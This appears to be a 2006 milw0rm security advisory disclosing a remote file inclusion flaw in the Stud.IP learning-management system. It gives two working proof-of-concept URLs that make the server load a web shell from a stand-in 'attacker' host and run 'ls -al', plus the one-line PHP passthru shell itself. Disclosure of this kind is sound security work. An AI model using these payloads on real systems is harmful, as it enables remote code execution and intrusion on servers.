@@ -1,0 +1,56 @@
+/*------------------------------------------------
+               IHS Public advisory
+-------------------------------------------------*/
+
+Stud.IP Remote File Inclusion
+Stud.IP is a learning and an information management
+system for universities, educational facilities and
+enterprises.
+
+http://www.studip.de
+http://www.data-quest.de
+http://www.sourceforge.net/projects/studip
+
+
+Discovered by Hamid Ebadi Credit :
+all go to IHS team (IHS : IRAN HOMELAND SECURITY)
+www.ihsteam.com (persian)
+www.ihsteam.net (english)
+
+
+The original article can be found at:
+http://www.hamid.ir/security/
+http://www.IHSteam.com
+
+Vulnerable Systems:
+       studip 1.3.0-2 and below
+
+
+Input passed to the "_PHPLIB[libdir]" parameter in
+studip-phplib/oohforms.inc and to the
+"ABSOLUTE_PATH_STUDIP"  parameter in
+studip-htdocs/archiv_assi.php is not properly verified
+before being used to include files.
+This can be exploited to execute arbitrary PHP code by
+including files from local or external resources.
+
+POC Exploits:
+
+The following URL will cause the server to include
+external files
+http://localhost/studip-1.3.0-2/studip-htdocs/archiv_assi.php?cmd=ls -al&ABSOLUTE_PATH_STUDIP=http://attacker/cmd.gif?
+http://localhost/studip-1.3.0-2/studip-phplib/oohforms.inc?cmd=ls -al&_PHPLIB[libdir]=http://attacker/cmd.gif?
+
+cmd.gif
+<?
+passthru($_GET['cmd']);
+?>
+
+Solution:
+Edit the source code to ensure that input is properly verified.
+
+
+greeting :
+LorD , NT , C0d3r of IHS
+
+# milw0rm.com [2006-07-01]
